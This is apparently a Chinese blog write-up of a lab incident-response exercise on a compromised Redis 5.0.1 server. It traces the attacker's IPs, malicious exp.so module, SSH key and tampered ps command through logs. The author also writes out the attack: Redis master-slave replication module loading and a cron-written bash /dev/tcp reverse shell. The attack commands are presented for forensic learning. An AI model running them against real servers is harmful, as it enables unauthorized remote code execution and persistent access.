+<ul>
+<li>多种数据结构：</li>
+</ul>
+<p>Redis 支持多种数据结构，使其非常灵活，能够适应不同类型的应用场景。</p>
+<p>支持的结构包括：字符串（Strings）、列表（Lists）、集合（Sets）、有序集合（Sorted Sets）、哈希（Hashes）、位图（Bitmaps）等。</p>
+<ul>
+<li>持久化：</li>
+</ul>
+<p>虽然 Redis 是内存数据库，但它支持将数据持久化到磁盘上，以防数据丢失。</p>
+<p>两种持久化方式：RDB（快照）和 AOF（追加文件）。</p>
+<ul>
+<li>复制（Replication）：</li>
+</ul>
+<p>Redis 支持主从复制，可以将数据从一个 Redis 服务器复制到多个从服务器，提供数据冗余和高可用性。</p>
+<ul>
+<li>高可用性：</li>
+</ul>
+<p>Redis 通过 Redis Sentinel 提供高可用性。Sentinel 监控 Redis 主从实例，并在主服务器不可用时自动进行故障转移。</p>
+<ul>
+<li>集群（Cluster）：</li>
+</ul>
+<p>Redis Cluster 提供自动分片和高可用性，允许 Redis 数据分布在多个节点上。</p>
+<ul>
+<li>事务：</li>
+</ul>
+<p>支持事务，可以保证一组命令的原子性。</p>
+<ul>
+<li>脚本：</li>
+</ul>
+<p>Redis 支持 Lua 脚本，使得可以在 Redis 服务器端执行复杂的逻辑。</p>
+<h3 id="基本的常见用途："><a href="#基本的常见用途：" class="headerlink" title="基本的常见用途："></a>基本的常见用途：</h3><ul>
+<li>缓存：</li>
+</ul>
+<p>由于 Redis 的高性能，常被用作缓存来存储频繁访问的数据，减少数据库负载和提高应用响应速度。</p>
+<ul>
+<li>会话存储：</li>
+</ul>
+<p>Redis 可以用来存储用户会话数据，如网站的用户登录会话等。</p>
+<ul>
+<li>消息队列：</li>
+</ul>
+<p>Redis 支持发布&#x2F;订阅、列表和有序集合，因此可以用作简单的消息队列系统。</p>
+<ul>
+<li>实时分析：</li>
+</ul>
+<p>Redis 可以用于实时数据分析和统计，如计数器、唯一用户统计等。</p>
+<ul>
+<li>排行榜&#x2F;计分板：</li>
+</ul>
+<p>由于有序集合的支持，Redis 非常适合实现排行榜和计分板功能。</p>
+<ul>
+<li>地理空间数据：</li>
+</ul>
+<p>Redis 提供了内置的地理空间数据类型和命令，可以处理和查询地理位置数据。<br>Redis 的强大功能和灵活性使其在现代应用中得到了广泛的应用，包括社交网络、实时分析、缓存、会话管理和队列处理等领域。</p>
+<h3 id="问题1：通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少"><a href="#问题1：通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少" class="headerlink" title="问题1：通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少"></a>问题1：通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少</h3><p>Redis服务器日志存放位置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/redis/redis.log</span><br></pre></td></tr></table></figure>
+
+<p><strong>Redis 日志文件通常用于记录 Redis 服务器的运行情况、错误信息和其他重要事件。这些日志文件默认存放在 <code>/var/log/</code> 目录下，但实际位置可以通过 Redis 配置文件 <code>redis.conf</code> 中的 <code>logfile</code> 参数进行配置</strong></p>
+<p>我们先查询一下redis版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli INFO | grep redis_version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118200210465.png" alt="image-20241118200210465"></p>
+<p>当然我们在日志中也是可以看到版本号的</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118200318025.png" alt="image-20241118200318025"></p>
+<p>对于 Redis 5.0.1，未授权访问 是最常见且可能性最大的漏洞，尤其是在 Redis 默认配置下没有设置密码的情况下。攻击者可以通过未授权访问执行以下操作：</p>
+<p>读取和修改数据：攻击者可以读取 Redis 数据库中的所有数据，甚至可以删除或修改数据。<br>远程代码执行：攻击者可以利用 CONFIG 命令修改配置文件来写入恶意代码，从而在目标服务器上执行任意代码。<br>持久化恶意代码：通过修改 Redis 的持久化配置，攻击者可以在服务器重启时执行恶意操作。</p>
+<p>接下来我们分析日志</p>
+<p>cat一下日志，发现日志内容并不算很多，我们可以慢慢看一下，会发现一个ip192.168.100.13出现了很多次</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118200445702.png" alt="image-20241118200445702"></p>
+<p>关键日志信息：</p>
+<ul>
+<li><p>MASTER &lt;-&gt; REPLICA sync started: 表示 Redis 副本（REPLICA）尝试与主服务器（MASTER）进行同步。</p>
+</li>
+<li><p>Error condition on socket for SYNC: Connection refused: 表示同步连接尝试失败，连接被拒绝。</p>
+</li>
+</ul>
+<p>所以这里可以看到这个ip在频繁的与服务器同步连接，但是都连接失败，说明这个ip在进行爆破，不过这个不是我们问题的ip</p>
+<p>我们继续分析</p>
+<p>我这里的话自己检索了一下ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat redis.log | grep 192.168</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118201335200.png" alt="image-20241118201335200"></p>
+<p>这里可以看到有三个ip，我就返回去逐个分析了</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118201112284.png" alt="image-20241118201112284"></p>
+<p>这里可以看到192.168.100.20的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">419:S 31 Jul 2023 05:34:33.786 * Connecting to MASTER 192.168.100.20:8888</span><br><span class="line">419:S 31 Jul 2023 05:34:33.786 * MASTER &lt;-&gt; REPLICA sync started</span><br><span class="line">419:S 31 Jul 2023 05:34:33.788 * Non blocking connect for SYNC fired the event.</span><br><span class="line">419:S 31 Jul 2023 05:34:35.192 * Master replied to PING, replication can continue...</span><br><span class="line">419:S 31 Jul 2023 05:34:35.194 * Trying a partial resynchronization (request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1).</span><br><span class="line">419:S 31 Jul 2023 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1</span><br><span class="line">419:S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.</span><br><span class="line">419:S 31 Jul 2023 05:34:35.195 * MASTER &lt;-&gt; REPLICA sync: receiving 48040 bytes from master</span><br><span class="line">419:S 31 Jul 2023 05:34:35.197 * MASTER &lt;-&gt; REPLICA sync: Flushing old data</span><br><span class="line">419:S 31 Jul 2023 05:34:35.197 * MASTER &lt;-&gt; REPLICA sync: Loading DB in memory</span><br><span class="line">419:S 31 Jul 2023 05:34:35.197 # Wrong signature trying to load DB from file</span><br><span class="line">419:S 31 Jul 2023 05:34:35.197 # Failed trying to load the MASTER synchronization DB from disk</span><br></pre></td></tr></table></figure>
+
+<p><strong>从这部分日志中，可以看到与192.168.100.20成功建立连接并进行同步。尽管尝试加载同步数据时出现错误，但连接和同步过程已经开始，这意味着攻击者已经能够通过这种连接尝试植入恶意代码或进一步操控系统。</strong></p>
+<p>加载恶意模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">419:S 31 Jul 2023 05:34:37.205 * Module &#x27;system&#x27; loaded from ./exp.so</span><br></pre></td></tr></table></figure>
+
+<p>最后，从日志中可以看到恶意模块exp.so被成功加载，这通常是黑客用来执行进一步攻击的手段。</p>
+<p>搬来了大佬的图片解析</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c1c44daa65c04b31fcaedea8562ff80a.png" alt="img"></p>
+<p>这里可以看到有建立主从复制的ID加载exp.so文件模块并进行持久化保存，所以我们猜测是使用了redis主从复制攻击，而且exp.so也经常用于主从复制攻击</p>
+<h4 id="redis主从复制攻击"><a href="#redis主从复制攻击" class="headerlink" title="redis主从复制攻击"></a>redis主从复制攻击</h4><p>Redis的主从复制是用来实现数据冗余和提高可用性的一种机制。</p>
+<p>1、从节点发送同步请求：从节点通过发送SYNC或PSYNC命令请求与主节点同步数据。</p>
+<p>2、全量同步：如果从节点是首次同步或与主节点的复制偏移量不匹配，主节点会执行BGSAVE命令创建一个RDB文件，并将其发送给从节点。从节点接收RDB文件并加载到内存中。</p>
+<p>3、增量同步：在全量同步之后，主节点会将其缓冲区中的写命令持续发送给从节点，以保证数据一致性。<br>我们用靶机打一下试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#连接靶机本地redis</span><br><span class="line">打开终端并输入命令 redis-cli</span><br><span class="line">#设置文件路径为/tmp/</span><br><span class="line">config set dir /tmp/ </span><br><span class="line">#设置数据库文件名为：exp.so</span><br><span class="line">config set dbfilename exp.so </span><br><span class="line">#设置主redis地址为 vpsip，端口为 port</span><br><span class="line">slaveof vpsip port </span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118203906432.png" alt="image-20241118203906432"></p>
+<p>然后我们查看一下日志</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118203939311.png" alt="image-20241118203939311"></p>
+<p>这里可以看到我们的exp2.so已经被记录到日志中，ip也是对的上的，所以这个exp.so一定就是黑客上传的恶意文件了</p>
+<h3 id="问题2-通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件"><a href="#问题2-通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件" class="headerlink" title="问题2:通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件"></a>问题2:通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件</h3><p>因为我们上面进行了一次攻击操作，也知道了这个exp.so就是我们想要找的恶意文件，但我们还是学习一下常规的人工排查方法去做这道题</p>
+<p>题目让我们找到黑客第一次上传的恶意文件，一般来说我们都会先去翻翻日志，看看有什么可疑的活动，接着筛选可疑命令，搜索如 CONFIG SET、SLAVEOF、MODULE LOAD 等命令，这些命令可能被黑客用来修改 Redis 的配置或者加载恶意模块。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo grep ‘CONFIG SET’ /var/log/redis.log</span><br><span class="line">sudo grep ‘SLAVEOF’ /var/log/redis.log</span><br><span class="line">sudo grep ‘MODULE LOAD’ /var/log/redis.log</span><br><span class="line">sudo grep ‘config set’ /var/log/redis.log</span><br><span class="line">sudo grep ‘slaveof’ /var/log/redis.log</span><br><span class="line">sudo grep ‘module load’ /var/log/redis.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118205110969.png" alt="image-20241118205110969"></p>
+<p>简单分析一下；</p>
+<p>根据日志，攻击者在多次执行 <code>SLAVEOF</code> 命令后，通过修改 Redis 的主从复制配置，将受害者的 Redis 实例配置为从属服务器，从而将恶意数据或命令同步到目标服务器。</p>
+<p>具体分析；</p>
+<ul>
+<li>05:33:15 - REPLICAOF 192.168.100.13:8888：</li>
+</ul>
+<p>攻击者首次执行 SLAVEOF 命令，将 Redis 配置为从属服务器，指向 192.168.100.13:8888。</p>
+<p>攻击者可能尝试与其控制的服务器建立连接，以同步数据。</p>
+<ul>
+<li>05:34:03 - REPLICAOF 192.168.31.55:8888：</li>
+</ul>
+<p>第二次执行 SLAVEOF 命令，将从属服务器的地址更改为 192.168.31.55:8888。</p>
+<p>这可能是因为与 192.168.100.13:8888 的连接失败，攻击者更换了控制服务器地址。</p>
+<ul>
+<li>05:34:33 - REPLICAOF 192.168.100.20:8888：</li>
+</ul>
+<p>第三次执行 SLAVEOF 命令，将从属服务器的地址再次更改为 192.168.100.20:8888。</p>
+<p>这可能是攻击者的第三个尝试，试图找到一个能够成功连接的控制服务器。</p>
+<ul>
+<li>05:34:37 - MASTER MODE enabled：</li>
+</ul>
+<p>最终攻击者将 Redis 配置为主服务器模式，说明他们已经成功掌控了 Redis 实例。<br>这一点通常是在成功与恶意服务器同步后，攻击者控制 Redis 实例所进行的操作。<br>我们在分析 Redis 日志的过程中，尽管能够识别出攻击者的行为（如多次尝试使用 SLAVEOF 命令），我们仍需要找到黑客上传的具体恶意文件。通常，黑客上传的文件可能包括恶意的 Redis 模块、恶意脚本等，这些文件会在 Redis 的数据目录或临时目录中生成。<br>所以这里我们还需要进一步检查 Redis 日志中提到的模块；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Module &#x27;system&#x27; loaded from&quot; /var/log/redis/redis.log</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">419:S 31 Jul 2023 05:34:37.205 * Module ‘system’ loaded from ./exp.so</span><br></pre></td></tr></table></figure>
+
+<p>我们再返回去看日志(直接搬的大佬的，懒得截图了)</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/fbfe99f0d7aefe424eb6171737f42161.png#pic_center" alt="在这里插入图片描述"></p>
+<ol>
+<li><strong>多次的<code>SLAVEOF</code> 命令</strong>：<ul>
+<li>攻击者首先将 Redis 配置为从属服务器指向 <code>192.168.31.55:8888</code>，然后又指向 <code>192.168.100.20:8888</code>。这可能是为了多次尝试连接攻击者的控制服务器。</li>
+</ul>
+</li>
+<li><strong>模块卸载</strong>：<ul>
+<li>在 <code>05:34:37.231</code> 时，模块被卸载。这可能是攻击者在执行完恶意操作后卸载模块以掩盖痕迹。</li>
+</ul>
+</li>
+<li><strong>多次保存数据库</strong>：<ul>
+<li>数据库在 <code>05:42:00</code> 和 <code>05:42:42</code> 时被保存到磁盘。这可能表明攻击者试图将恶意数据持久化。</li>
+</ul>
+</li>
+<li><strong>加载恶意模块</strong>：<ul>
+<li>日志显示在 <code>05:34:37.205</code> 时加载了名为 <code>system</code> 的模块（从 <code>./exp.so</code> 路径）。这很可能是一个恶意模块。</li>
+</ul>
+</li>
+</ol>
+<p>那问题又来了</p>
+<h4 id="为什么-SLAVEOF-算作恶意行为？"><a href="#为什么-SLAVEOF-算作恶意行为？" class="headerlink" title="为什么 SLAVEOF 算作恶意行为？"></a>为什么 SLAVEOF 算作恶意行为？</h4><p>利用漏洞：通过 SLAVEOF 命令，攻击者可以让目标 Redis 实例连接到他们控制的主服务器，从而将恶意数据同步到目标服务器上。<br>模块加载：在同步过程中，攻击者可以利用模块加载功能，将恶意模块（如 exp.so）加载到目标服务器上，从而执行任意代码或篡改数据。</p>
+<h4 id="那我们应该如何找到恶意文件呢"><a href="#那我们应该如何找到恶意文件呢" class="headerlink" title="那我们应该如何找到恶意文件呢?"></a>那我们应该如何找到恶意文件呢?</h4><p>sudo find -name exp.so</p>
+<p>不过我们可以发现，我们上面的命令都是需要管理员权限才能执行的，不然的话是找不到命令的</p>
+<h3 id="问题3-通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少"><a href="#问题3-通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少" class="headerlink" title="问题3:通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少"></a>问题3:通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少</h3><p>想要知道怎么找到反弹shell，我们得先了解一下redis未授权攻击反弹shell</p>
+<p>攻击手法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.100.13 #连接</span><br><span class="line"> </span><br><span class="line">redis flushall #清除所有键值</span><br><span class="line"> </span><br><span class="line">config set dir /var/spool/cron/crontabs/ #设置保存路径</span><br><span class="line"> </span><br><span class="line">config set dbfilename shell #保存名称</span><br><span class="line"> </span><br><span class="line">set xz “\n * bash -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1\n” #将反弹shell写入xz键值</span><br><span class="line"> </span><br><span class="line">save #写入保存路径的shell文件</span><br></pre></td></tr></table></figure>
+
+<p>我们先看一下开放端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lanpt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118211547724.png" alt="image-20241118211547724"></p>
+<p>发现并没有什么端口是web的，判断黑客不是通过写入 webshell 反弹的 shell</p>
+<p>那我们看一下定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118211127370.png" alt="image-20241118211127370"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>这段命令是一种用于创建反向Shell连接的技术</p>
+<p>分析一下</p>
+<ul>
+<li><code>/bin/sh -i</code>: 启动一个交互式Shell。</li>
+<li><code>&gt;&amp;</code>: 重定向标准输出和标准错误输出。</li>
+<li><code>/dev/tcp/192.168.100.13/7777</code>: 通过TCP连接到IP地址<code>192.168.100.13</code>的端口<code>7777</code>。在一些Unix-like系统中，<code>/dev/tcp/host/port</code>是一种特殊的文件描述符，通过它可以实现网络连接。</li>
+<li><code>0&gt;&amp;1</code>: 将标准输入重定向到标准输出。</li>
+</ul>
+<p>所以直接把这个ip交了就可以了</p>
+<h3 id="问题4-通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串"><a href="#问题4-通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串" class="headerlink" title="问题4:通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串"></a>问题4:通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串</h3><p>这个的话就相对简单了，就是分析ssh登录情况</p>
+<p>通常 SSH 登录的日志记录在系统的安全日志文件中，但是，SSH（Secure Shell）提供了两种主要的登录验证方式；</p>
+<ol>
+<li>密码验证（Password Authentication）</li>
+</ol>
+<p>工作原理：</p>
+<p>用户在登录时需要提供用户名和密码。<br>服务器接收用户名和密码后，验证它们是否匹配预先存储的凭证。<br>如果用户名和密码正确，用户即可登录服务器。<br>2. 公钥验证（Public Key Authentication）</p>
+<p>工作原理：</p>
+<p>用户生成一对 SSH 密钥对，包括私钥和公钥。<br>公钥被上传并存储在目标服务器的用户账户下的 ~&#x2F;.ssh&#x2F;authorized_keys 文件中。<br>用户在登录时使用其私钥进行身份验证。<br>服务器通过匹配用户提供的私钥和存储的公钥来验证用户身份。<br>如果匹配成功，用户即可登录服务器。所以我们可以从两点看出；</p>
+<ul>
+<li><p>Redis 配置：黑客利用 Redis 的未授权访问或其他漏洞，将自己的公钥写入了服务器的 ~&#x2F;.ssh&#x2F;authorized_keys 文件中，从而可以使用 SSH 公钥验证进行登录。</p>
+</li>
+<li><p>登录日志：SSH 登录日志通常会显示使用的验证方式。虽然在提供的日志中没有明确显示公钥验证，但结合 Redis 被利用的情况，可以推测黑客可能通过这种方式获取了访问权限。</p>
+</li>
+</ul>
+<p>所以我们的主机上往往都会写入ssh密钥，那我们先查一下ssh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">///查看目录有没有ssh文件</span><br><span class="line">ls -la</span><br><span class="line">//进入ssh文件</span><br><span class="line">cd .ssh</span><br><span class="line">//查看公钥文件</span><br><span class="line">cat authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118212348752.png" alt="image-20241118212348752"></p>
+<p>最后可以看到用户名是xj -test-user</p>
+<p>搜一下</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118212539097.png" alt="image-20241118212539097"></p>
+<p>然后我搜寻了好半天才找到flag</p>
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118213038940.png" alt="image-20241118213038940"></p>
+<h3 id="问题5-通过本地-PC-SSH到服务器并且分析黑客篡改的命令"><a href="#问题5-通过本地-PC-SSH到服务器并且分析黑客篡改的命令" class="headerlink" title="问题5:通过本地 PC SSH到服务器并且分析黑客篡改的命令"></a>问题5:通过本地 PC SSH到服务器并且分析黑客篡改的命令</h3><p>这个的话工程量就比较大了</p>
+<p>我们一步步来吧</p>
+<ol>
+<li><p><strong>先看命令历史</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
+
+<p>没什么收获</p>
+</li>
+<li><p><strong>检查系统路径中的命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118213713443.png" alt="image-20241118213713443"></p>
+</li>
+</ol>
+<p>发现了一个特别的命令，rwxrwxrwx权限，意思是这个命令具有读取，写入和执行权限，并且对所有用户都开放</p>
+<p>我们看一下这个ps命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241118213847088.png" alt="image-20241118213847088"></p>
+<p>脚本解析：</p>
+<p>#!&#x2F;bin&#x2F;bash 表示这是一个 Bash 脚本，用来执行后续的命令。</p>
+<ul>
+<li>变量设置：</li>
+</ul>
+<p>oldifs&#x3D;”$IFS”：保存旧的字段分隔符（IFS）值。<br>IFS&#x3D;’$n’：设置新的字段分隔符为$n（这里可能是一个笔误，正常应该是换行符\n，但写法上看起来可能是在尝试定义一个特殊分隔符）。</p>
+<ul>
+<li>命令执行和处理：</li>
+</ul>
+<p>result&#x3D;$(ps_ $1 $2 $3|grep -v ‘threadd’ )：执行 ps_ 命令，并使用 grep 命令过滤掉包含’threadd’的行，将结果存储在 result 变量中。</p>
+<p>for v in $result;：对 $result 中的每个变量 v 进行循环处理。</p>
+<p>echo -e “$v\t”;：输出每个变量 v，并在末尾添加一个制表符。</p>
+<ul>
+<li>恢复原始设置：</li>
+</ul>
+<p>IFS&#x3D;”$oldifs”：恢复原始的字段分隔符设置。</p>
+<p>分析总结：</p>
+<p>这段脚本似乎是为了获取 ps_ 命令的输出，并按行处理和输出结果。ps_ 命令的具体功能和输出内容在这里并未详细说明，但可以我们可以推测这是一个对系统进程进行查询和处理的脚本。</p>
+<p>把注释内容进行提交就可以了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x01正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">第二章日志分析-apache日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFapache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">什么是apache日志分析？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">Apache日志分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">常见日志文件位置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%981-%E6%8F%90%E4%BA%A4%E5%BD%93%E5%A4%A9%E8%AE%BF%E9%97%AE%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84IP%EF%BC%8C%E5%8D%B3%E9%BB%91%E5%AE%A2IP"><span class="toc-number">2.1.2.</span> <span class="toc-text">问题1:提交当天访问次数最多的IP，即黑客IP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cut%E5%92%8Ccat%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">cut和cat命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%982-%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.1.3.</span> <span class="toc-text">问题2:黑客使用的浏览器指纹是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9"><span class="toc-number">2.1.3.1.</span> <span 